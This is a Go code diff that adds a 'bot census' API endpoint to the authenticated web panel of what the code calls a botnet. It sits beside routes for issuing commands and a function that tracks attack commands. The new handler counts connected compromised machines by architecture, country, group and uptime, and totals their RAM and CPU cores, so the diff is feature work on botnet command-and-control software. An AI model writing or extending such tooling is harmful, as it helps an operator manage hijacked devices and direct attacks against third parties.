@@ -416,6 +416,7 @@ func NewWebMux() http.Handler {
 	mux.HandleFunc("/logout", handleWebLogout)
 	mux.HandleFunc("/api/bots", requireWebAuth(handleAPIBots))
 	mux.HandleFunc("/api/stats", requireWebAuth(handleAPIStats))
+	mux.HandleFunc("/api/stats/bots", requireWebAuth(handleAPIBotCensus))
 	mux.HandleFunc("/api/command", requireWebAuth(handleAPICommand))
 	mux.HandleFunc("/api/activity", requireWebAuth(handleAPIActivity))
 	mux.HandleFunc("/api/groups", requireWebAuth(handleAPIGroups))
@@ -774,6 +775,76 @@ func handleAPIStats(w http.ResponseWriter, r *http.Request) {
 	}
 	w.Header().Set("Content-Type", "application/json")
 	json.NewEncoder(w).Encode(stats)
+}
+
+// apiBotCensus is an aggregate snapshot of the botnet: per-arch, per-country,
+// per-group counts plus uptime bucketing. Intended for scripted monitoring;
+// /api/bots returns the full per-bot list, this returns only totals.
+type apiBotCensus struct {
+	Total        int            `json:"total"`
+	ByArch       map[string]int `json:"byArch"`
+	ByCountry    map[string]int `json:"byCountry"`
+	ByGroup      map[string]int `json:"byGroup"`
+	UptimeBucket map[string]int `json:"uptimeBucket"` // <1m, <1h, <1d, >=1d
+	TotalRAM     int64          `json:"totalRAMMB"`
+	TotalCPU     int            `json:"totalCPUCores"`
+	GeneratedAt  string         `json:"generatedAt"`
+}
+
+func handleAPIBotCensus(w http.ResponseWriter, r *http.Request) {
+	census := apiBotCensus{
+		ByArch:       make(map[string]int),
+		ByCountry:    make(map[string]int),
+		ByGroup:      make(map[string]int),
+		UptimeBucket: map[string]int{"<1m": 0, "<1h": 0, "<1d": 0, ">=1d": 0},
+		GeneratedAt:  time.Now().Format(time.RFC3339),
+	}
+
+	now := time.Now()
+	botConnsLock.RLock()
+	for _, bc := range botConnections {
+		if !bc.authenticated {
+			continue
+		}
+		census.Total++
+		census.TotalRAM += bc.ram
+		census.TotalCPU += bc.cpuCores
+
+		if bc.arch != "" {
+			census.ByArch[bc.arch]++
+		} else {
+			census.ByArch["unknown"]++
+		}
+		if bc.country != "" {
+			census.ByCountry[bc.country]++
+		} else {
+			census.ByCountry["??"]++
+		}
+
+		botGroupsLock.RLock()
+		group := botGroups[bc.botID]
+		botGroupsLock.RUnlock()
+		if group == "" {
+			group = "none"
+		}
+		census.ByGroup[group]++
+
+		age := now.Sub(bc.connectedAt)
+		switch {
+		case age < time.Minute:
+			census.UptimeBucket["<1m"]++
+		case age < time.Hour:
+			census.UptimeBucket["<1h"]++
+		case age < 24*time.Hour:
+			census.UptimeBucket["<1d"]++
+		default:
+			census.UptimeBucket[">=1d"]++
+		}
+	}
+	botConnsLock.RUnlock()
+
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(census)
 }
 
 // trackWebAttack parses attack commands from the web panel and adds them to ongoingAttacks.
